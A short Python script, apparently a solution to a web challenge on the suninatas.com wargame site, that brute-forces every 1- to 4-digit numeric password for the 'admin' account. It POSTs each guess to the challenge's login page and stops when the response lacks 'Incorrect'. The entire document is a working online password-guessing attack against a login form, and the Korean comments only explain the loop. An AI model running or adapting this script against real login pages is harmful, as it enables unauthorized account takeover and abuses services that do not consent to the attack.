import itertools
import requests

test_str = "0123456789" #0 ~ 9999까지

for pw_length in range(1, 5) : 
    for pw in itertools.product(test_str, repeat=pw_length) : #product = for와 동일함
        password = ''.join(pw)
        login_packet= {
            "id" : "admin",
            'pw' : password
        }
        address = requests.post('http://www.suninatas.com/challenge/web08/web08.asp', data = login_packet)
        print(password)

        if address.text.find("Incorrect") == -1:
            exit()
